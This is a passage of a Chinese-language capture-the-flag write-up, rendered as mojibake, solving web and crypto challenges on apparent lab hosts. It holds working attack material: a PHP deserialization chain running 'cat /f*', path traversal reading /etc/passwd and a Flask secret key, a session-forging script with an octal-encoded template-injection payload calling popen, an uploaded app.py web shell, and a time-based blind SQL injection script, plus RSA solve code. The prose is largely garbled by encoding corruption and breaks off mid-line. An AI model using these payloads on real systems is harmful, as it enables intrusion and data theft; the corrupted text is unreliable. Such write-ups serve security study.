è°ƒç”¨ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§ \n&#x2F;&#x2F;éœ€è¦è§¦å‘Reverseä¸­çš„__get()æ–¹æ³•  å°±éœ€è¦è§¦å‘Cryptoä¸­çš„__toString()æ–¹æ³• â€“&gt; è¢«å½“æˆä¸€ä¸ªå¯¹è±¡æ—¶è°ƒç”¨\n&#x2F;&#x2F;éœ€è¦è§¦å‘Cryptoä¸­çš„__toString()æ–¹æ³• å°±éœ€è¦é€šè¿‡startä¸­çš„__destruct()æ–¹æ³•\n\næ‰€ä»¥å®Œæ•´çš„popé“¾ï¼š__destruct()-&gt;__toString()-&gt;__get($var)-&gt;__invoke()-&gt;Web\næ„é€ pocï¼š\n&lt;?phpclass Start&#123;    public $errMsg;&#125;class Pwn&#123;    public $obj;&#125;class Reverse&#123;    public $func;&#125;class Web&#123;    public $func = &quot;system&quot;;    public $var = &quot;cat /f*&quot;;&#125;class Crypto&#123;    public $obj;&#125;$a = new Start();$a-&gt;errMsg = new Crypto();$b = $a-&gt;errMsg;$b-&gt;obj = new Reverse();$c = $b-&gt;obj;$c-&gt;func = new Pwn();$d = $c-&gt;func;$d-&gt;obj = new Web();echo serialize($a);\n\nO:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;\næ ¹æ®é¢˜ç›®æç¤ºä»¥åŠæºä»£ç ä¸­å‡ºç°throw new Exception(&quot;Nope&quot;);\nè¿™ä¼šå¯¼è‡´ååºåˆ—åŒ–ä¹‹åç›´æ¥ç»è¿‡å¼‚å¸¸æŠ¥é”™ï¼Œå¯¼è‡´åé¢çš„__destruct() æ— æ³•è§¦å‘\n\nå¿«é€Ÿè§¦å‘destruct\n\nä¿®æ”¹åºåˆ—åŒ–æ•°å­—çš„ä¸ªæ•°\nåŸpaylaodï¼šO:5:â€Startâ€:1:{s:6:â€errMsgâ€;O:6:â€Cryptoâ€:1:{s:3:â€objâ€;O:7:â€Reverseâ€:1:{s:4:â€funcâ€;O:3:â€Pwnâ€:1:{s:3:â€objâ€;O:3:â€Webâ€:2:{s:4:â€funcâ€;s:6:â€systemâ€;s:3:â€varâ€;s:7:â€cat &#x2F;f*â€;}}}}}\nç°payloadï¼šO:5:â€Startâ€:2:{s:6:â€errMsgâ€;O:6:â€Cryptoâ€:1:{s:3:â€objâ€;O:7:â€Reverseâ€:1:{s:4:â€funcâ€;O:3:â€Pwnâ€:1:{s:3:â€objâ€;O:3:â€Webâ€:2:{s:4:â€funcâ€;s:6:â€systemâ€;s:3:â€varâ€;s:7:â€cat &#x2F;f*â€;}}}}}\n\nå»æ‰åºåˆ—åŒ–å°¾éƒ¨(å»æ‰ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²æœ€åçš„ä¸€ä¸ªå¤§æ‹¬å·)\nO:5:â€Startâ€:1:{s:6:â€errMsgâ€;O:6:â€Cryptoâ€:1:{s:3:â€objâ€;O:7:â€Reverseâ€:1:{s:4:â€funcâ€;O:3:â€Pwnâ€:1:{s:3:â€objâ€;O:3:â€Webâ€:2:{s:4:â€funcâ€;s:6:â€systemâ€;s:3:â€varâ€;s:7:â€cat &#x2F;f*â€;}}}}\n\n\n\nçŸ¥è¯†ç‚¹ï¼š\n\nPHPä¸­ï¼Œå¦‚æœå•ç‹¬æ‰§è¡Œunserializeå‡½æ•°è¿›è¡Œå¸¸è§„çš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–åçš„æ•´ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»å°±æ²¡äº†ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šæ‰§è¡Œå®ƒã€‚\n\nPHPä¸­ï¼Œå¦‚æœç”¨ä¸€ä¸ªå˜é‡æ¥ä½ååºåˆ—åŒ–å‡½æ•°çš„è¿”å›å€¼ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–çš„å¯¹è±¡å…¶ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œç”±äºå®ƒä¸€ç›´éƒ½å­˜åœ¨äºè¿™ä¸ªå˜é‡å½“ä¸­ï¼Œé‚£ä¹ˆåœ¨PHPè„šæœ¬èµ°å®Œæµç¨‹ä¹‹åï¼Œè¿™ä¸ªå¯¹è±¡æ‰ä¼šè¢«é”€æ¯ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šå°†å…¶æ‰§è¡Œã€‚\n\n\nInjectMeè€ƒç‚¹ï¼šç›®å½•ç©¿è¶Š+sessionä¼ªé€ +SSTI bypass\ndockerfile:\nFROM vulhub/flask:1.1.1ENV FLAG=flag&#123;not_here&#125;COPY src/ /appRUN mv /app/start.sh /start.sh &amp;&amp; chmod 777 /start.shCMD [ &quot;/start.sh&quot; ]EXPOSE 8080\n\næ ¹æ®é¢˜ç›®æç¤ºç©¿è¶Šæˆ‘çš„ç§˜å¯†ï¼Œç‹ ç‹ åœ°æ³¨å…¥ï¼ä»¥åŠæ‰“å¼€é¢˜ç›®ç‚¹å‡»å›¾ç‰‡ï¼Œç‚¹åˆ°110.jpgå‘ç° æ˜¯pythonçš„flaskæ¡†æ¶\n\nçŒœæµ‹å¯èƒ½æ˜¯ç›®å½•ç©¿è¶Šï¼Œç”±äºå†™åˆ°å°†â€œ..&#x2F;â€æ›¿æ¢æˆâ€œâ€ï¼Œäºæ˜¯æ„é€ ..././..././..././..././etc/passwdâ€“&gt;../../../../etc/passwd  æˆ–è€… ....//....//....//....//etc/passwd\nä¸‹è½½æ–‡ä»¶å¾—åˆ°ï¼š\nroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n\næ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯ï¼Œæ¥ç€æ‰¾åˆ°dockerfileæ–‡ä»¶ä¸­å­˜åœ¨appç›®å½•ï¼Œäºæ˜¯çŒœæµ‹æœåŠ¡å™¨è¿è¡Œä»£ç app.pyä»£ç å­˜åœ¨å…¶ä¸­ï¼Œè®¿é—®ä¸‹è½½ ....//....//....//....//app/app.py\nimport osimport refrom flask import Flask, render_template, request, abort, send_file, session, render_template_stringfrom config import secret_keyapp = Flask(__name__)app.secret_key = secret_key@app.route(&#x27;/&#x27;)def hello_world():  # put application&#x27;s code here    return render_template(&#x27;index.html&#x27;)@app.route(&quot;/cancanneed&quot;, methods=[&quot;GET&quot;])def cancanneed():    all_filename = os.listdir(&#x27;./static/img/&#x27;)    filename = request.args.get(&#x27;file&#x27;, &#x27;&#x27;)    if filename:        return render_template(&#x27;img.html&#x27;, filename=filename, all_filename=all_filename)    else:        return f&quot;&#123;str(os.listdir(&#x27;./static/img/&#x27;))&#125; &lt;br&gt; &lt;a href=\\&quot;/cancanneed?file=1.jpg\\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;@app.route(&quot;/download&quot;, methods=[&quot;GET&quot;])def download():    filename = request.args.get(&#x27;file&#x27;, &#x27;&#x27;)    if filename:        filename = filename.replace(&#x27;../&#x27;, &#x27;&#x27;)        filename = os.path.join(&#x27;static/img/&#x27;, filename)        print(filename)        if (os.path.exists(filename)) and (&quot;start&quot; not in filename):            return send_file(filename)        else:            abort(500)    else:        abort(404)@app.route(&#x27;/backdoor&#x27;, methods=[&quot;GET&quot;])def backdoor():    try:        print(session.get(&quot;user&quot;))        if session.get(&quot;user&quot;) is None:            session[&#x27;user&#x27;] = &quot;guest&quot;        name = session.get(&quot;user&quot;)        if re.findall(                r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.&#x27;,                name):            abort(500)        else:            return render_template_string(                &#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27; % name)    except Exception:        abort(500)@app.errorhandler(404)def page_not_find(e):    return render_template(&#x27;404.html&#x27;), 404@app.errorhandler(500)def internal_server_error(e):    return render_template(&#x27;500.html&#x27;), 500if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=8080)\n\nå®¡è®¡æºç å‘ç°ï¼šfrom config import secret_key ä»¥åŠ@app.route(&#39;/backdoor&#39;, methods=[&quot;GET&quot;])\n\nfrom config import secret_keyï¼Œé¦–å…ˆæ ¹æ®æ­¤çŒœæµ‹å¯èƒ½å­˜åœ¨config.pyæ–‡ä»¶ï¼Œå…¶ä¸­å­˜åœ¨secret_key\n\näºæ˜¯è®¿é—®ä¸‹è½½....//....//....//....//app/config.py\nå¾—åˆ°ï¼šsecret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;\n\nä¼ªé€ seesionï¼Œè¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼Œæœ‰å…³é”®å­—è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡\n\nå®˜æ–¹è„šæœ¬æ›´æ”¹ç›¸å…³ä¿¡æ¯ï¼š\nimport reimport requestsimport subprocess# æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py# https://github.com/noraj/flask-session-cookie-managerdef string_to_octal_ascii(s):    octal_ascii = &quot;&quot;    for char in s:        char_code = ord(char)        octal_ascii += &quot;\\\\\\\\&quot; + format(char_code, &#x27;03o&#x27;)    # octal_ascii += &quot;\\\\\\\\&quot; + format(char_code, &#x27;o&#x27;)    return octal_asciisecret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;# payload = &quot;&#123;%print(7*7)%&#125;&quot;# payload = &quot;&#123;%print(\\&quot;\\&quot;\\\\\\\\u005f\\\\\\\\u005f\\&quot;\\&quot;)%&#125;&quot;# payload = &quot;&#123;%print(\\&quot;\\&quot;\\\\\\\\x5f\\\\\\\\x5f\\&quot;\\&quot;)%&#125;&quot;eval_shell = &quot;\\&quot;\\&quot;&quot; + string_to_octal_ascii(&quot;__import__(\\&quot;os\\&quot;).popen(\\&quot;cat /*\\&quot;).read()&quot;) + &quot;\\&quot;\\&quot;&quot;print(eval_shell)# dockeréƒ¨ç½²&amp;windowsè¿è¡Œpayload# &#123;&#123;x.__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;)&#125;&#125;payload = &quot;&#123;&#123;%print(xxx|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)(\\&quot;\\&quot;\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\&quot;\\&quot;)(&#123;0&#125;))%&#125;&#125;&quot;.format(eval_shell)print(payload)command = &quot;D:\\\\program\\\\python3\\\\python.exe flask_session_cookie_manager3.py encode -s \\&quot;&#123;0&#125;\\&quot; -t \\&quot;&#123;&#123;&#x27;user&#x27;:&#x27;&#123;1&#125;&#x27;&#125;&#125;\\&quot;&quot;.format(secret_key, payload)print(command)session_data = subprocess.check_output(command, shell=True)print(session_data)# linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚session_data = session_data[:-2].decode(&#x27;utf-8&#x27;)# session_data = session_data[:-1].decode(&#x27;utf-8&#x27;)print(session_data)url = &quot;http://0b401771-d36b-47ca-8971-2b9dedf4b9e0.node4.buuoj.cn:81/backdoor&quot;cookies = &#123;&quot;session&quot;: session_data&#125;res = requests.get(url=url, cookies=cookies)# print(res.text)pattern = r&#x27;&lt;h1&gt;(.*)&lt;/h1&gt;&#x27;result_content = re.search(pattern, res.text, re.S)# print(result_content)if result_content:    result = result_content.group(1)    print(result)else:    print(&quot;something wrong!&quot;)\n\nflask diskç‚¹å¼€é¢˜ç›®å‡ºç° list fileã€upload filesã€admin manage\nä¾æ¬¡ç‚¹å‡»ï¼Œåˆ°admin manageå‡ºç°\n\nè¿™èƒ½å¾—åˆ°æ˜¯python flaskæ¡†æ¶ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ï¼Œåœ¨debugæ¨¡å¼ä¸‹app.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ï¼Œåªéœ€ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–\nfrom flask import Flask,requestimport osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    try:        cmd = request.args.get(&#x27;cmd&#x27;)        date = os.popen(cmd).read()        return date    except:        pass    return &quot;1&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,port=5000,debug=True)\n\n\n\n\nfrom flask import Flask, requestï¼šå¯¼å…¥äº†Flaskæ¡†æ¶ä»¥åŠrequestæ¨¡å—ï¼Œç”¨äºåˆ›å»ºWebåº”ç”¨ç¨‹åºå’Œå¤„ç†HTTPè¯·æ±‚ã€‚\nimport osï¼šå¯¼å…¥äº†Pythonçš„osæ¨¡å—ï¼Œç”¨äºæ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚\napp &#x3D; Flask(_name_)ï¼šåˆ›å»ºä¸€ä¸ªFlaskåº”ç”¨ç¨‹åºå®ä¾‹ã€‚\n@app.route(â€˜&#x2F;â€˜)ï¼šå®šä¹‰äº†ä¸€ä¸ªè·¯ç”±ï¼Œå½“ç”¨æˆ·è®¿é—®æ ¹è·¯å¾„(â€˜&#x2F;â€˜)æ—¶ï¼Œå°†æ‰§è¡Œä¸‹é¢çš„indexå‡½æ•°ã€‚\ndef index()ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸ºindexçš„å‡½æ•°ï¼Œç”¨äºå¤„ç†ç”¨æˆ·çš„HTTPè¯·æ±‚ã€‚\ncmd &#x3D; request.args.get(â€˜cmdâ€™)ï¼šä»HTTPè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ä¸­è·å–åä¸ºâ€™cmdâ€™çš„å‚æ•°çš„å€¼ï¼Œè¯¥å€¼åº”è¯¥åŒ…å«ä¸€ä¸ªè¦æ‰§è¡Œçš„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚\ndate &#x3D; os.popen(cmd).read()ï¼šä½¿ç”¨os.popenæ‰§è¡Œè·å–åˆ°çš„å‘½ä»¤ï¼Œå¹¶å°†æ‰§è¡Œç»“æœå­˜å‚¨åœ¨dateå˜é‡ä¸­ã€‚\nreturn dateï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™æ„å‘³ç€å¦‚æœç”¨æˆ·æä¾›äº†åˆæ³•çš„æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œè¯¥å‘½ä»¤å¹¶è¿”å›ç»“æœã€‚return â€œ1â€ï¼šå¦‚æœæ²¡æœ‰æä¾›â€™cmdâ€™å‚æ•°æˆ–å‘ç”Ÿå¼‚å¸¸ï¼ŒæœåŠ¡å™¨å°†è¿”å›å­—ç¬¦ä¸²â€1â€ã€‚\n\næ¥ç€è®¿é—®ï¼šhttp://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=ls%20/\nhttp://f003e914-33c2-4635-9170-1b7cb9c5f4a8.node4.buuoj.cn:81/?cmd=cat%20/flag\nmidsqlè€ƒå¯Ÿsqlæ—¶é—´ç›²æ³¨ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ— å›æ˜¾\nimport timeimport requestsresult = &#x27;&#x27;last = &#x27; &#x27;for i in range(1, 1000):    for j in range(127, 31, -1):        url = &#x27;http://3498ba56-0b4f-4a64-b19a-4ef45047e7df.node4.buuoj.cn:81/?id=&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # information_schema,mysql,performance_schema,sys,test,ctf        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # id,name,price        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        # payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;        payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(4),0)&#x27;        url = url + payload        # print(url)        start_time = time.time()        response = requests.get(url=url)        end_time = time.time()        if (end_time - start_time) &gt;3:            last = result            result += chr(j + 1)            break    print(result)\n\n\n\ncryptoRSA Variation IIé¢˜ç›®ï¼š\nfrom secret import flagfrom Crypto.Util.number import *p = getPrime(1024)q = getPrime(1024)N = p*p*qd= inverse(N, (p-1)*(q-1)//GCD(p-1, q-1))m = bytes_to_long(flag)c = pow(m, N, N)print(&#x27;c =&#x27;, c)print(&#x27;N =&#x27;, N)print(&#x27;d =&#x27;, d)# c = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463# N = 1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439# d = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079\n\næ ¹æ®é¢˜ç›®æç¤ºSchmidt-Samoaå¯†ç \n\nSchmidt-Samoaå¯†ç ç³»ç»Ÿ\n\nSchmidt-Samoaå¯†ç ç³»ç»Ÿï¼ŒåƒrabinåŠ å¯†ä¸€æ ·ï¼Œå…¶å®‰å…¨æ€§åŸºäºæ•´æ•°å› å¼åˆ†è§£çš„éš¾åº¦ã€‚ä½† Rabin è§£å¯†æ—¶ä¼šå¾—åˆ°å››ä¸ªè§£ï¼Œè€Œ Schmidt-Samor å¾—åˆ°çš„æ˜¯å”¯ä¸€è§£ã€‚\n\nå¯†é’¥ç”Ÿæˆ\n\nâ€‹       1.é€‰å–ä¸¤ä¸ªå¤§çš„è´¨æ•°på’Œqå¹¶è¿›è¡Œè®¡ç®— N &#x3D; p^2^q \nâ€‹       2.è®¡ç®— d &#x3D; invert (N , Ï† (pq)) \n\nåŠ å¯†\n\nå¯¹æ¶ˆæ¯mï¼Œè®¡ç®—å¯†æ–‡ C &#x3D; m^N^  mod N\n\nè§£å¯†\n\nè®¡ç®—æ˜æ–‡ m &#x3D; C^d^  mod  pq\nä¸¾ä¾‹ï¼š\n\n\np&#x3D;7, q&#x3D;11,  N&#x3D;p^2^q&#x3D;539 ,  d &#x3D; N ^-1^ mod  lcm ( p âˆ’ 1 , q âˆ’ 1 ) &#x3D; 29 \nm &#x3D; 32 ,  c &#x3D; m^N^ mod N &#x3D; 373\n\n\néªŒè¯ï¼š\n\nm&#x3D;c^d^  mod pq &#x3D; 373 ^29^ mod pq &#x3D; 373^29^ mod 77 &#x3D; 32\n\nå…³äºè·å–pqçš„é—®é¢˜\nç”± N &#x3D; p ^2^ âˆ— q , d * N &#x3D; 1 mod (q-1) (p-1)é€šè¿‡æ¬§æ‹‰å®šç†å¯ä»¥å¾—åˆ°ï¼š\n\na ^(p1-)(q-1)^ â‰¡ 1 mod pq\n\næ‰€ä»¥ï¼š\n\na^N^ âˆ— d &#x3D; a^1+kâˆ—(qâˆ’1)(pâˆ’1)^ â‰¡ aâˆ—a^kâˆ—(qâˆ’1)(pâˆ’1)^&#x3D;a  mod pq \n\næ‰€ä»¥ï¼š\n\nk âˆ— pq&#x3D;a^Nâˆ—d^ âˆ’ apq &#x3D;  gcd(a^N*d^ - a,N)å› ä¸ºaçš„å–å€¼å¯ä»¥æ˜¯ a &#x3D; 2,3,4,5â€¦ï¼Œè¿™é‡Œæ–¹ä¾¿è®¡ç®—æˆ‘ä»¬å– 2\n\nè§£å¯†exp:\nfrom libnum import*N =  1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439#N = p^2*qd = 20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079c = 1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463pq = gcd(pow(2,d*N,N)-2,N)m = pow(c,d,pq)print(n2s(m))\n\nsignin[å®˜æ–¹è§£]\nè€ƒç‚¹ï¼š p-1å…‰æ»‘ï¼Œå¤šæ¬¡rabin ï¼š\n\nFLAGï¼šflag{new1sstar_welcome_you}\n\nè§£é¢˜æ­¥éª¤\n\n\ndef uniPrime(bits):        while True:                n = 2                while n.bit_length() &lt; bits:                        n *= choice(sieve_base)                if isPrime(n + 1):                        return n + 1\n\né˜…è¯»ä»£ç å¯çŸ¥p-1å…‰æ»‘,å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼åˆ†è§£\n\nå†æ¥çœ‹e,e&#x3D;65536*3\nå¯ä»¥çœ‹ä½œ 2*163ï¼Œé‚£ä¹ˆå¯¹rabinè§£å¯†åçš„ç»“æœå†æ¬¡rabinï¼Œå…±16æ¬¡rabinè§£å¯†\nä»£ç å¦‚ä¸‹ï¼š\nfrom Crypto.Util.number import *N= 3326716005321175474866311915397401254111950808705576293932345690533263108414883877530294339294274914837424580618375346509555627578734883357652996005817766370804842161603027636393776079113035745495508839749006773483720698066943577445977551268093247748313691392265332970992500440422951173889419377779135952537088733c= 2709336316075650177079376244796188132561250459751152184677022745551914544884517324887652368450635995644019212878543745475885906864265559139379903049221765159852922264140740839538366147411533242116915892792672736321879694956051586399594206293685750573633107354109784921229088063124404073840557026747056910514218246import gmpy2a = 2n = 2while True:    a = pow(a, n, N)    res = gmpy2.gcd(a-1, N)    if res != 1 and res != N:        q = N // res        p = res        break    n += 1print(2**16)e=65536*3n = p*qx0=gmpy2.invert(p,q)x1=gmpy2.invert(q,p)cs = [c]for i in range(16):    ps = []    for c2 in cs:        r = pow(c2, (p + 1) // 4, p)        s = pow(c2, (q + 1) // 4, q)        x = (r * x1 * q + s * x0 * p) % n        y = (r * x1 * q - s * x0 * p) % n        if x not in ps:            ps.append(x)        if n - x not in ps:            ps.append(n - x)        if y not in ps:            ps.append(y)        if n - y not in ps:            ps.append(n - y)    cs = psfor m in ps:    flag = long_to_bytes(gmpy2.iroot(m,3)[0])    print(flag)\n\n\n\n\nå®˜æ–¹WriteUpï¼šhttps://shimo.im/docs/gXqmdVvbOEsXpo3o/read\n\nBabyNRTU[å®˜æ–¹è§£]\nè€ƒç‚¹ï¼šNTRU æ ¼æ”»å‡»åœ¨äºŒç»´çš„æƒ…å½¢\n\nFLAGï¼šflag{Lattice_reduction_magic_on_NTRU#82b08b2d}\n\nè§£é¢˜æ­¥éª¤\n\n\nfrom Crypto.Util.number import long_to_bytes# h,q = 